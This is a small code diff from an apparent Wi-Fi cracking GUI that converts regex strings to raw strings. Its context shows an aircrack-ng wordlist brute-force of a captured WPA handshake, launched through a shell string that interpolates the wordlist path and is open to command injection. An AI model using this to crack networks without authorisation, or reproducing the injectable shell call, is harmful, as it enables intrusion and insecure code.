@@ -153,12 +153,12 @@ class wpa_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
 
         if(key_type == "WPS PIN"):
             key_string = self.wps_pin_label.text()
-            actual_key = re.findall("WPS PIN: ([\S \w]+)</font>",key_string)
+            actual_key = re.findall(r"WPS PIN: ([\S \w]+)</font>",key_string)
             if(actual_key):
                 self.clipboard_key = actual_key[0]
         else:
             key_string = self.key_label.text()
-            actual_key = re.findall("WPA KEY: ([\S \w]+)</font>",key_string)
+            actual_key = re.findall(r"WPA KEY: ([\S \w]+)</font>",key_string)
             if(actual_key):
                 self.clipboard_key = actual_key[0]
         self.clipbord.setText(self.clipboard_key)
@@ -541,9 +541,9 @@ class wpa_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
 
 
     def launch_brutefore(self):
-        current_word_regex = re.compile("Current passphrase: ([\w\s!@#$%^&*()-=_+]+)",re.IGNORECASE)
-        keys_speed_regex = re.compile("(\d+.?\d+) k/s",re.IGNORECASE)
-        keys_tested_regex = re.compile("(\d+) keys tested",re.IGNORECASE)
+        current_word_regex = re.compile(r"Current passphrase: ([\w\s!@#$%^&*()-=_+]+)",re.IGNORECASE)
+        keys_speed_regex = re.compile(r"(\d+.?\d+) k/s",re.IGNORECASE)
+        keys_tested_regex = re.compile(r"(\d+) keys tested",re.IGNORECASE)
 
         crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \naircrack-ng -a 2 -w '%s' wpa_dump-01.cap -l wpa_key.txt" % (self.wordlist),
                              shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
